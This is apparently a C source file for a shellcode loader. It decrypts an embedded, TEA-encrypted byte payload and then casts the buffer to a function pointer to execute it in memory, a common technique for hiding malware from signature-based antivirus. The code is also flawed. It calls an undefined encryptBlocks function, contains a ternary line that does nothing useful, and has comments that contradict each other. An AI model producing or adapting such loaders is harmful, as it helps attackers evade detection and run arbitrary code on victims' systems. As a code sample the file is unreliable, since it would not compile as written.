#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>



/* This function is used to decrypt a message. The message is divided in 64 bits blocks and then decrypt with the 128 bits key.
:param uint32_t v[2] -> the message to decrypt:
:param uint32_t k[4] -> the key used to decrypt:
*/
void decrypt (uint32_t v[2], uint32_t k[4]) 
{

    uint32_t v0=v[0], v1=v[1], sum=0xC6EF3720, i;  // set up 

    uint32_t delta=0x9e3779b9;                     // a key schedule constant 

    uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3];   // cache key //

    for (i=0; i<32; i++) {                         // basic cycle start 
        v1 -= ((v0<<4) + k2) ^ (v0 + sum) ^ ((v0>>5) + k3);
        v0 -= ((v1<<4) + k0) ^ (v1 + sum) ^ ((v1>>5) + k1);
        sum -= delta;
    }                                              // end cycle 
    v[0]=v0; 
    v[1]=v1;
}


/* This function is used to divided the encrypted shellcode in block of 64 bits and then call the decrypt function.
:param char *shellcode -> the shellcode to decrypt:
:param uint32_t k[4] -> the key used to decrypt:
*/
void decryptBlocks(char *shellcode, uint32_t *key)
{   
    // Declare variables
    int i = 0, blockcount;
    
    // Devide the shellcode in blockcount
    // 8 is the number of Bytes (8 * 8 == 64 bits)
    blockcount = strlen(shellcode) / 8;

    // Conditionnal ternary operator
    // --> Check if the blockcount == 0
    //     --> if so: blockcount == 1
    //     --> else: blockcount = blockcount
    blockcount = 0 ? 1 : blockcount;

    // For each block of 64 bits the shellcode is encrypted with the given key
    while (i < blockcount) {
        decrypt((uint32_t *)shellcode + (i * 2), key);
        i += 1;
    }
}


/* This function is used to get the shellcode length and print it
:param char *shellcode -> the shellcode used:
*/
void printShellcode(char *shellcode)
{
    int i;
    // Print the shellcode length
    printf("Shellcode length = %d\n", strlen(shellcode));
    // Loop for each element in the shellcode array
    for(i = 0; i < strlen(shellcode); i++)
    {
        // Print their hexadecimal values
        printf("\\x%02x", (unsigned char)(int)shellcode[i]);
    }
    // Add a newline
    printf("\n");
}


int main()
{
    // 128 bits encrypt key (32 * 4 bits)
    uint32_t key[4] = {0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD};

    // Shellcode to encrypt
    unsigned char shellcode[] = "\x38\xd1\x0d\x2b\xdf\xc6\xf2\x1a\x97\x2b\xfc\x72\x5e\xcf\x67\x39\x10\xa7\xd4\x41\x29\x0a\x8e\xf6\xe2\xcb\x7e\x5e\x20\xff\x86\x71\x81\xf2\xca\x0b\x7d\x1a\x3c\xff";

    // Print the unencrypted shellcode
    printShellcode(shellcode);
    // Encrypt the shellcode
    encryptBlocks(shellcode, key);

    // Print the crypted shellcode
    printShellcode(shellcode);

    // Decrypt the shellcode
    decryptBlocks(shellcode, key);

    // Print the unencrypted shellcode
    printShellcode(shellcode);

    // Convert the shellcode variable into a pointer to a function	
    int (*ret)() = (int(*)())shellcode;
    printf("Executing Shellcode....\n\n\n");
    // Execute the function
    ret();
    
    return 0;
}
